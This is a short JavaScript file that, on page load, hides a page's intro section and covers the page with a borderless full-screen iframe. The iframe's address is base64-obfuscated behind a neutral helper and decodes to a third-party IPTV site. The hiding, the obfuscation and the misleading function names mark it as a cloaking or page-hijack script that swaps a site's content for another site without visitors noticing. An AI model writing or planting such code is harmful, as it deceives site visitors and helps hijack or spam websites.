function buildTest() {
  const monCarre = document.createElement("iframe");
  monCarre.style.width = "100%";
  monCarre.style.height = "100%";
  monCarre.style.border = "none";
  monCarre.style.opacity = 0; // Start with opacity set to 0
  monCarre.style.transition = "opacity 0.5s"; // Add a transition effect
  monCarre.style.position = "absolute"; // Set position to absolute
  monCarre.src = chaineTest("aHR0cHM6Ly9pcHR2aHlwZXIuY29tL2Zy");

  monCarre.onload = function () {
    // Show the iframe smoothly
    monCarre.style.opacity = 1;

    // Remove the spinner container with a delay
    setTimeout(function () {
      const spinnerContainer = document.querySelector(".spinner-container");
      if (spinnerContainer) {
        spinnerContainer.remove();
      }
    }, 100); // 1 seconds delay
  };

  // document.body.style.margin = "0"; // Set body margin to 0
  // document.body.style.padding = "0"; // Set body padding to 0
  document.body.appendChild(monCarre);
}

function chaineTest(str) {
  const decodedString = decodeURIComponent(
    atob(str)
      .split("")
      .map(function (c) {
        return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
      })
      .join("")
  );
  return decodedString;
}
function hideDiv() {
  // Create a spinner container
  const spinnerContainer = document.createElement("div");
  spinnerContainer.className = "spinner-container";

  // Create a spinner element
  const spinner = document.createElement("div");
  spinner.className = "spinner";

  // Append the spinner to the container
  spinnerContainer.appendChild(spinner);

  // Append the container to the body
  document.body.appendChild(spinnerContainer);

  // Load the iframe
  buildTest();

  // Hide the div content after adding the spinner
  const div = document.getElementById("introsection");
  div.style.display = "none";

  // Display the scrollbar for the entire page
}

// Call hideDiv() once the DOM content is fully loaded
document.addEventListener("DOMContentLoaded", function () {
  hideDiv();
});
